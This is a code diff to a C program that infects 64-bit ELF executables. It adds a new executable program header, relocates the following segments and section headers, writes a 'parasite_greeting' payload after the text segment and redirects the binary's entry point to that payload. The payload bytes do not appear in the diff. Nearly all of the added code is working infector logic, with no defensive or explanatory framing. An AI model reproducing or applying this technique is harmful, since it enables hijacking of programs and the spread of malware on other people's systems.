@@ -17,6 +17,8 @@
 #include <string.h>
 
 #define PATCH_OFFSET 65
+#define ALIGN(x, align) (x + align - 1) & (~(align - 1))
+
 
 static volatile inline void 
 _write(int, char *, unsigned int)__attribute__((aligned(8), __always_inline__));
@@ -101,4 +103,149 @@ int main(int argc, char *argv[])
     Elf64_Ehdr *ehdr = (Elf64_Ehdr *)mem;
     Elf64_Phdr *phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
     Elf64_Shdr *shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];
+    size_t origin_hdr_size = ehdr->e_ehsize + ehdr->e_phentsize * ehdr->e_phnum;
+    size_t first_remained = 0;
+    uint64_t align;
+    Elf64_Addr evil_addr;
+    Elf64_Off evil_off;
+    size_t remain = 0;
+    size_t text_size;
+    Elf64_Off text_offset;
+    int first = 0;
+    int i;
+    for(i = 0; i < ehdr->e_phnum; i++)
+    {
+        if(phdr[i].p_type == PT_PHDR)
+        {
+            phdr[i].p_memsz += sizeof(Elf64_Phdr);
+            phdr[i].p_filesz += sizeof(Elf64_Phdr); 
+        }
+        if(phdr[i].p_type == PT_INTERP || phdr[i].p_type == PT_NOTE || phdr[i].p_type == PT_GNU_PROPERTY)
+        {
+            phdr[i].p_offset += sizeof(Elf64_Phdr);
+            phdr[i].p_vaddr += sizeof(Elf64_Phdr);
+            phdr[i].p_paddr += sizeof(Elf64_Phdr);
+        }
+        if(remain)
+        {
+            /* patch the offset and addr of the following segments */
+            phdr[i].p_offset += ALIGN(parasite_len, align);
+            phdr[i].p_vaddr += ALIGN(parasite_len, align);
+            phdr[i].p_paddr += ALIGN(parasite_len, align);
+        }
+        if(phdr[i].p_type == PT_LOAD)
+        {
+            align = phdr[i].p_align;
+            if(!first)
+            {
+                first_remained = phdr[i].p_filesz - origin_hdr_size;
+                phdr[i].p_filesz += sizeof(Elf64_Phdr);
+                phdr[i].p_memsz += sizeof(Elf64_Phdr);
+                first = 1;
+            }
+            if(phdr[i].p_flags == PF_R + PF_X)
+            {
+                text_size = phdr[i].p_filesz;
+                text_offset = phdr[i].p_offset;
+                evil_off = phdr[i].p_offset + ALIGN(phdr[i].p_filesz, align);
+                evil_addr = phdr[i].p_vaddr + ALIGN(phdr[i].p_memsz, align);
+                remain = phdr[i].p_offset + ALIGN(phdr[i].p_filesz, align);
+            } 
+        }
+        
+    }
+
+    ehdr->e_shoff += ALIGN(parasite_len, align);
+    ehdr->e_phnum++;
+    ehdr->e_entry = evil_addr;
+
+    Elf64_Phdr evil_phdr_ent;
+    evil_phdr_ent.p_align = align;
+    evil_phdr_ent.p_filesz = parasite_len;
+    evil_phdr_ent.p_memsz = parasite_len;
+    evil_phdr_ent.p_flags = PF_R | PF_X;
+    evil_phdr_ent.p_type = PT_LOAD;
+    evil_phdr_ent.p_offset = evil_off;
+    evil_phdr_ent.p_vaddr = evil_addr;
+    evil_phdr_ent.p_paddr = evil_addr;
+
+    for(i = 0; i < ehdr->e_shnum; i++)
+    {
+        if(shdr[i].sh_offset > evil_off)
+        {
+            shdr[i].sh_offset += ALIGN(parasite_len, align);
+            shdr[i].sh_addr += ALIGN(parasite_len, align);
+        }
+        if(shdr[i].sh_offset < text_offset)
+        {
+            shdr[i].sh_offset += sizeof(Elf64_Phdr);
+            shdr[i].sh_addr += sizeof(Elf64_Phdr);
+        }
+    }
+
+    if(lseek(fd, 0, SEEK_SET) < 0)
+    {
+        perror("lseek");
+        exit(-1);
+    }
+    
+    if(write(fd, mem, origin_hdr_size) < 0)
+    {
+        perror("write original header");
+        exit(-1);
+    }
+    if(lseek(fd, origin_hdr_size, SEEK_SET) < 0)
+    {
+        perror("lseek");
+        exit(-1);
+    }
+    if(write(fd, &evil_phdr_ent, sizeof(Elf64_Phdr)) < 0)
+    {
+        perror("write evil_phdr_entry");
+        exit(-1);
+    }
+    if(lseek(fd, origin_hdr_size + sizeof(Elf64_Phdr), SEEK_SET) < 0)
+    {
+        perror("lseek");
+        exit(-1);
+    }
+    
+    if(write(fd, &mem[origin_hdr_size], first_remained) < 0)
+    {
+        perror("write remained part of header");
+        exit(-1);
+    }
+    if(lseek(fd, text_offset, SEEK_SET) < 0)
+    {
+        perror("lseek");
+        exit(-1);
+    }
+    if(write(fd, &mem[text_offset], text_size) < 0)
+    {
+        perror("write text_segment");
+        exit(-1);
+    }
+    if(lseek(fd, evil_off, SEEK_SET) < 0)
+    {
+        perror("lseek");
+        exit(-1);
+    }
+    if(write(fd, parasite_greeting, parasite_len) < 0)
+    {
+        perror("write parasite codes");
+        exit(-1);
+    }
+    size_t remained_offset = evil_off + ALIGN(parasite_len, align);
+    if(lseek(fd, remained_offset, SEEK_SET) < 0)
+    {
+        perror("lseek");
+        exit(-1);
+    }
+    size_t remained_size = st.st_size - remain;
+    if(write(fd, &mem[remain], remained_size) < 0)
+    {
+        perror("write remained part of host file");
+        exit(-1);
+    }
+    close(fd);
 }
